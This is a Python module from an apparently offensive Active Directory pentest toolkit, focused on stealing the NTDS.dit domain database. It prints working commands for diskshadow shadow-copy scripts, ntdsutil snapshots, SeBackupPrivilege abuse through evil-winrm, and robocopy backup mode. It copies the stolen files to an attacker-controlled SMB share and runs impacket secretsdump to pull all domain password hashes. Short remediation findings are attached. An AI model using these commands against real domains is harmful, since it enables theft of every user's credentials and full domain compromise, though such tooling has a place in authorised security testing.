"""
Module: Shadow Copies & Backup Abuse
Techniques: VSS / diskshadow / ntdsutil / Backup Operators group NTDS extraction
"""
from utils.helpers import *
from config.settings import SESSION

def run():
    print_banner("SHADOW COPIES & BACKUP ABUSE")
    dc   = input_or_session("dc_ip",    "DC IP")
    dom  = input_or_session("domain",   "Domain")
    user = input_or_session("username", "Username")
    pw   = input_or_session("password", "Password")

    print(f"""
  [1]  List VSS Shadow Copies
  [2]  Extract NTDS.dit via diskshadow
  [3]  ntdsutil snapshot (local on DC)
  [4]  Backup Operators → NTDS via SeBackupPrivilege
  [5]  robocopy with Backup privilege
  [6]  Parse NTDS.dit locally (impacket)
  [0]  Back
""")
    c = input(f"  {M}Choice:{RST} ").strip()

    if c == "1":
        print(f"""
  {Y}List shadow copies:{RST}
  vssadmin list shadows
  Get-WmiObject Win32_ShadowCopy | select DeviceObject,InstallDate
""")

    elif c == "2":
        attacker = prompt("Attacker IP")
        print(f"""
  {Y}diskshadow script (save as shadow.txt, upload to DC):{RST}
  set context persistent nowriters
  add volume c: alias ntds
  create
  expose %ntds% z:
  exec "cmd.exe" "/c copy z:\\Windows\\NTDS\\NTDS.dit C:\\Windows\\Temp\\ntds_bak.dit"
  delete shadows volume %ntds%
  reset

  {Y}Run on DC:{RST}
  diskshadow /s .\\shadow.txt
  reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system_bak.hiv

  {Y}Exfiltrate:{RST}
  Copy-Item C:\\Windows\\Temp\\ntds_bak.dit \\\\{attacker}\\share\\
  Copy-Item C:\\Windows\\Temp\\system_bak.hiv \\\\{attacker}\\share\\

  {Y}Parse:{RST}
  impacket-secretsdump -ntds ntds_bak.dit -system system_bak.hiv LOCAL
  {Y}CRLF WARNING - generate script on Kali with correct line endings:{RST}
  printf "set context persistent nowriters\\r\\nadd volume c: alias ntds\\r\\ncreate\\r\\nexpose %%ntds%% z:\\r\\nexec \"cmd.exe\" \"/c copy z:\\\\Windows\\\\NTDS\\\\NTDS.dit C:\\\\Windows\\\\Temp\\\\ntds_bak.dit\"\\r\\ndelete shadows volume %%ntds%%\\r\\nreset\\r\\n" > /tmp/shadow.txt
""")
        info("CRLF WARNING: Diskshadow scripts MUST have CRLF line endings - use printf with \\r\\n on Kali")
        add_finding("NTDS.dit via diskshadow", "Critical",
                    "NTDS.dit extracted via VSS shadow copy",
                    "Restrict diskshadow; monitor VSS events; rotate all credentials")

    elif c == "3":
        print(f"""
  {Y}ntdsutil IFM (local on DC — DA/SYSTEM required):{RST}
  ntdsutil "ac in ntds" "ifm" "create full C:\\ntds_snap" q q

  {Y}Parse:{RST}
  impacket-secretsdump \\
    -ntds "C:\\ntds_snap\\Active Directory\\ntds.dit" \\
    -system "C:\\ntds_snap\\registry\\SYSTEM" LOCAL
""")

    elif c == "4":
        bu_user = prompt("Backup Operators member username")
        print(f"""
  {Y}Backup Operators → NTDS (evil-winrm):{RST}
  evil-winrm -i {dc} -u {bu_user} -p '<password>'

  # Load SeBackupPrivilege DLLs (upload first):
  Import-Module .\\SeBackupPrivilegeCmdLets.dll
  Import-Module .\\SeBackupPrivilegeUtils.dll

  # Copy NTDS (bypasses ACL via Backup privilege):
  Copy-FileSeBackupPrivilege \\\\127.0.0.1\\c$\\Windows\\NTDS\\NTDS.dit C:\\Temp\\ntds_bak.dit
  reg save HKLM\\SYSTEM C:\\Temp\\system_bak.hiv

  download ntds_bak.dit
  download system_bak.hiv
""")
        add_finding("Backup Operators Abuse", "Critical",
                    f"Backup Operators member {bu_user} extracted NTDS.dit",
                    "Remove non-essential users from Backup Operators group")

    elif c == "5":
        print(f"""
  {Y}robocopy with SeBackupPrivilege:{RST}
  # Verify privilege enabled:
  whoami /priv | findstr SeBackupPrivilege

  robocopy /b C:\\Windows\\NTDS C:\\Temp\\ntds_copy ntds.dit
  reg save HKLM\\SYSTEM C:\\Temp\\SYSTEM
""")

    elif c == "6":
        ntds   = prompt("Path to ntds.dit")
        system = prompt("Path to SYSTEM hive")
        outfile= prompt("Output prefix") or "/tmp/ad_hashes"
        run_cmd(f"{imp('secretsdump.py')} -ntds '{ntds}' -system '{system}' LOCAL -outputfile '{outfile}'")
        add_finding("NTDS.dit Parsed", "Critical",
                    f"All domain hashes extracted from {ntds}",
                    "Rotate all credentials; reset krbtgt twice (24h apart)")

    pause()
